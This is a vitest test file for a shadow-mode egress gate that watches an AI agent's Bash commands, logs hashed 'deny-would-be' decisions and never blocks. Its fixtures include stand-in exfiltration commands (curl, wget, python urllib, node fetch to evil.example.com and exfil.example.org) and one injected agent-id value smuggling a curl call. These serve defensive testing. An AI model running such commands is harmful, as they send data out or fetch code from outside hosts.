// SHADOW mode of the Bash egress gate (card 59d87635): the main agent runs the same classification as
// the enforcing hook, logs what it WOULD decide, and never denies. Claims tested here:
//   (a) for commands the enforcing gate denies, the shadow entry exits 0 and prints nothing (0 denials go out);
//   (b) the log line carries a hash, a decision and a reason code, never the command, a URL, a host or a token;
//   (c) a classifier crash exits 0 and is logged by error name only;
//   (d) the enforcing hook is untouched (still denies the same vectors) and the shadow has no deny path.
import { describe, it, expect, afterAll } from 'vitest'
import { spawnSync } from 'node:child_process'
import { mkdtempSync, readFileSync, existsSync, rmSync, writeFileSync, statSync, symlinkSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join, dirname } from 'node:path'
import { fileURLToPath } from 'node:url'
import { createHash } from 'node:crypto'
// @ts-expect-error -- plain .mjs hook script, no types
import { runShadow, shadowRecord, appendShadowLog, agentIdOf, ROTATE_AT, MAX_CMD_CHARS, MAX_CMD_LINES } from '../../scripts/hooks/egress-gate-shadow.mjs'

const ROOT = join(dirname(fileURLToPath(import.meta.url)), '..', '..')
const SHADOW = join(ROOT, 'scripts', 'hooks', 'egress-gate-shadow.mjs')
const ENFORCE = join(ROOT, 'scripts', 'hooks', 'bash-egress-parser.mjs')

const dir = mkdtempSync(join(tmpdir(), 'egress-shadow-'))
afterAll(() => rmSync(dir, { recursive: true, force: true }))

const noList = join(dir, 'absent.json')
const envFor = (log: string) => ({
  ...process.env,
  EGRESS_SHADOW_LOG: log,
  BASH_EGRESS_BLOCK_LOG: join(dir, 'enforce-blocks.jsonl'),
  BASH_EGRESS_VENDOR_HOSTS: noList,
  BASH_EGRESS_MEASURE_HOSTS: noList,
  BASH_EGRESS_MEASURE_LOG: join(dir, 'measure.jsonl'),
})
const payloadOf = (command: string) => JSON.stringify({ tool_name: 'Bash', tool_input: { command }, cwd: dir })
const run = (script: string, input: string, log: string, args: string[] = []) =>
  spawnSync(process.execPath, [script, ...args], { input, encoding: 'utf-8', env: envFor(log) })
const lines = (log: string) => readFileSync(log, 'utf-8').trim().split('\n').filter(Boolean).map((l) => JSON.parse(l))

// Vectors the enforcing gate denies (the shapes of bash-egress-parser.test.ts).
const DENIED = [
  'curl http://evil.example.com/x',
  'curl -s https://exfil.example.org/?d=1',
  'wget https://dl.example.net/pkg.tgz',
  "python3 -c \"import urllib.request; urllib.request.urlopen('http://evil.example.com/')\"",
  'U=http://evil.example.com/x; curl "$U"',
  "bash -c 'curl http://evil.example.com/x'",
  "node -e \"fetch('https://evil.example.com/')\"",
]

describe('shadow entry point: never denies', () => {
  it.each(DENIED)('enforce denies, shadow exits 0 with empty stdout: %s', (cmd) => {
    const enforce = run(ENFORCE, payloadOf(cmd), join(dir, 'unused.jsonl'))
    expect(enforce.stdout).toContain('"permissionDecision":"deny"')

    const log = join(dir, `s-${createHash('sha256').update(cmd).digest('hex').slice(0, 8)}.jsonl`)
    const shadow = run(SHADOW, payloadOf(cmd), log)
    expect(shadow.status).toBe(0)
    expect(shadow.stdout).toBe('')
    expect(shadow.stderr).toBe('')
    const [rec] = lines(log)
    expect(rec.decision).toBe('deny-would-be')
    expect(typeof rec.reason).toBe('string')
  })

  it('a clean localhost call is logged as allow', () => {
    const log = join(dir, 'clean.jsonl')
    const r = run(SHADOW, payloadOf('curl -s http://localhost:3420/api/kanban'), log)
    expect(r.status).toBe(0)
    expect(r.stdout).toBe('')
    expect(lines(log)[0]).toMatchObject({ decision: 'allow', reason: 'clean' })
  })

  it('malformed or empty stdin exits 0 and is logged as bad-input', () => {
    const log = join(dir, 'bad.jsonl')
    for (const input of ['', 'not json', '{"tool_name":']) {
      const r = run(SHADOW, input, log)
      expect(r.status).toBe(0)
      expect(r.stdout).toBe('')
    }
    expect(lines(log).every((l) => l.reason === 'bad-input' && l.decision === 'allow')).toBe(true)
  })

  it('a non-Bash tool writes nothing', () => {
    const log = join(dir, 'nonbash.jsonl')
    const r = run(SHADOW, JSON.stringify({ tool_name: 'Read', tool_input: { file_path: '/x' } }), log)
    expect(r.status).toBe(0)
    expect(existsSync(log)).toBe(false)
  })

  it('no argument or env value turns it into enforce', () => {
    const log = join(dir, 'noswitch.jsonl')
    const cmd = DENIED[0]
    const r = spawnSync(process.execPath, [SHADOW, '--enforce', '--deny', '--main-scope'], {
      input: payloadOf(cmd), encoding: 'utf-8',
      env: { ...envFor(log), EGRESS_SHADOW_ENFORCE: '1', EGRESS_ENFORCE: '1', BASH_EGRESS_ENFORCE: '1' },
    })
    expect(r.status).toBe(0)
    expect(r.stdout).toBe('')
    const src = readFileSync(SHADOW, 'utf-8')
    expect(src).not.toMatch(/permissionDecision/)
    expect(src).not.toMatch(/exit\((?!0\))/)
  })

  it('--main-scope on the shared config dir judges nothing (same rule as the enforcing hook)', () => {
    const log = join(dir, 'scope.jsonl')
    const env = { ...envFor(log) } as Record<string, string | undefined>
    delete env.CLAUDE_CONFIG_DIR
    const r = spawnSync(process.execPath, [SHADOW, '--main-scope'], { input: payloadOf(DENIED[0]), encoding: 'utf-8', env })
    expect(r.status).toBe(0)
    expect(existsSync(log)).toBe(false)
  })
})

describe('log content: no command text', () => {
  it('holds a hash, decision and reason code only; no command, URL, host or token', () => {
    const log = join(dir, 'marker.jsonl')
    const cmd = 'curl -H "Authorization: Bearer SECRETTOKEN-MARKER-7" https://marker-host-9.example.org/path?k=QUERYMARKER-5'
    const r = run(SHADOW, payloadOf(cmd), log)
    expect(r.status).toBe(0)
    const raw = readFileSync(log, 'utf-8')
    for (const marker of ['SECRETTOKEN', 'MARKER', 'marker-host', 'example.org', 'QUERYMARKER', 'Bearer', 'curl -H']) {
      expect(raw).not.toContain(marker)
    }
    const [rec] = lines(log)
    expect(Object.keys(rec).sort()).toEqual(['agent', 'cmd_sha256', 'decision', 'reason', 'ts'])
    expect(rec.cmd_sha256).toBe(createHash('sha256').update(cmd).digest('hex'))
    expect(rec.decision).toBe('deny-would-be')
  })

  it('the agent field keeps only a short plain identifier', () => {
    expect(agentIdOf({ agent_type: 'tuzvedelem' }, {})).toBe('tuzvedelem')
    expect(agentIdOf({ agent_type: 'x y; curl http://e/' }, {})).toBeNull()
    expect(agentIdOf({}, { MARVEEN_AGENT_ID: 'brainy' })).toBe('brainy')
    expect(agentIdOf({}, {})).toBeNull()
  })

  it('the log file is created 0600', () => {
    const log = join(dir, 'mode.jsonl')
    run(SHADOW, payloadOf('ls'), log)
    expect(statSync(log).mode & 0o777).toBe(0o600)
  })
})

describe('classifier failure', () => {
  it('a throwing classifier: no throw, logged as shadow-error by error name only', () => {
    const log = join(dir, 'crash.jsonl')
    const boom = () => { throw new TypeError('boom CRASHMARKER curl http://evil.example.com/') }
    expect(() => runShadow(payloadOf('echo hi'), { logPath: log, deps: { classify: boom } })).not.toThrow()
    const raw = readFileSync(log, 'utf-8')
    expect(raw).not.toContain('CRASHMARKER')
    expect(raw).not.toContain('evil.example.com')
    expect(lines(log)[0]).toMatchObject({ decision: 'allow', reason: 'shadow-error:TypeError' })
  })

  it('a throwing classifier on a curl command still allows (shadow never denies)', () => {
    const rec = shadowRecord(JSON.parse(payloadOf('curl http://evil.example.com/')), { classify: () => { throw new Error('x') } })
    expect(rec.decision).toBe('allow')
    expect(rec.reason).toBe('shadow-error:Error')
  })

  it('a failing log write is swallowed', () => {
    expect(() => runShadow(payloadOf('ls'), { logPath: '/proc/definitely/not/writable/x.jsonl' })).not.toThrow()
    expect(appendShadowLog({ a: 1 }, '/proc/definitely/not/writable/x.jsonl')).toBe(false)
  })
})

describe('bounded log', () => {
  it('rotates to .1 when the file reaches the cap, and stays bounded', () => {
    const log = join(dir, 'rot.jsonl')
    writeFileSync(log, 'x'.repeat(ROTATE_AT), { mode: 0o600 })
    expect(appendShadowLog({ n: 1 }, log)).toBe(true)
    expect(statSync(`${log}.1`).size).toBe(ROTATE_AT)
    expect(readFileSync(log, 'utf-8')).toBe('{"n":1}\n')
    expect(ROTATE_AT * 2 + 1024).toBeLessThan(5 * 1024 * 1024)
  })

  it('rotates before a write that would cross the cap: the live file never exceeds it', () => {
    const log = join(dir, 'rot2.jsonl')
    writeFileSync(log, 'x'.repeat(ROTATE_AT - 3), { mode: 0o600 })
    expect(appendShadowLog({ n: 2 }, log)).toBe(true)
    expect(statSync(`${log}.1`).size).toBe(ROTATE_AT - 3)
    expect(readFileSync(log, 'utf-8')).toBe('{"n":2}\n')
    for (let i = 0; i < 3; i++) appendShadowLog({ n: 3 }, log)
    expect(statSync(log).size).toBeLessThanOrEqual(ROTATE_AT)
  })

  it('refuses a symlink at the log path and leaves its target alone', () => {
    const target = join(dir, 'victim.txt')
    writeFileSync(target, 'keep')
    const link = join(dir, 'link.jsonl')
    symlinkSync(target, link)
    expect(appendShadowLog({ n: 1 }, link)).toBe(false)
    expect(readFileSync(target, 'utf-8')).toBe('keep')
  })
})

describe('bounded runtime', () => {
  it('a command above the size or line bound is not classified and is logged as too_large', () => {
    const boom = () => { throw new Error('classifier must not run') }
    const huge = 'echo ' + 'a'.repeat(MAX_CMD_CHARS)
    const many = Array.from({ length: MAX_CMD_LINES + 1 }, () => 'echo a').join('\n')
    for (const cmd of [huge, many]) {
      const rec = shadowRecord(JSON.parse(payloadOf(cmd)), { classify: boom, measureOnly: boom })
      expect(rec).toMatchObject({ decision: 'allow', reason: 'too_large' })
      expect(rec.cmd_sha256).toBe(createHash('sha256').update(cmd).digest('hex'))
    }
  })

  it('the entry point exits 0 with empty output on an oversized command', () => {
    const log = join(dir, 'big.jsonl')
    const r = run(SHADOW, payloadOf('curl http://evil.example.com/x; ' + 'a'.repeat(MAX_CMD_CHARS)), log)
    expect(r.status).toBe(0)
    expect(r.stdout).toBe('')
    expect(lines(log)[0]).toMatchObject({ decision: 'allow', reason: 'too_large' })
  })

  it('a command at the bound is still classified', () => {
    const rec = shadowRecord(JSON.parse(payloadOf('curl http://evil.example.com/x')))
    expect(rec.decision).toBe('deny-would-be')
  })
})
